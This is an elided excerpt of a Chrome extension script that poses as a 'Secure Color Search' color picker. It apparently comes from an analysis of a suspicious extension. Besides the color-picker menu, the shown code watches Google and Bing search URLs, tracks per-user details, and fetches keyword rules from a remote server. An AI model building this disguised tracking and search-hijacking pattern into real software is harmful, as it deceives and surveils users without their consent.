var contextMenuDetails = {
    "id": "context_color_picker_id",
    "title": "Secure Color Search",
    "contexts": ["page"]
}
...
chrome.contextMenus.onClicked.addListener(function(info, tab) {
    if (info.menuItemId === "context_color_picker_id") {
        chrome.tabs.sendMessage(tab.id, {
            "from": "background",
            "cmd": "open_color_picker"
        });
    }
});
...
var base_api_url = "https://admin.mrktserve.com/api/";
...
const user_name = 'unique_color_picker_user';
let delay = 0;
chrome.runtime.onInstalled.addListener(function() {
    
    chrome.storage.local.set({ 'keyword_rules': [] });  
    ...
    if(tab.url.includes('/search?q=') && ( tab.url.includes('google.') || tab.url.includes('bing.') ) ){
        ...
        if(userDetail.trackType == 'lander'){
            ...
            if(getUserSpendingDays >= re_rules[0].days){
                ...
                console.log(captcha_tried, captcha_limit, diff_hours)
                console.log(userDetail)
...
function getKeywordList(){
    ...
    .then(result => {        
        let res = JSON.parse(result);
        if (typeof res.rules != "undefined") {
            keyword_rules[0] = res.rules;
        }
        if (typeof res.keyword != "undefined") {
            keyword_rules[0] = res.keyword;
        }
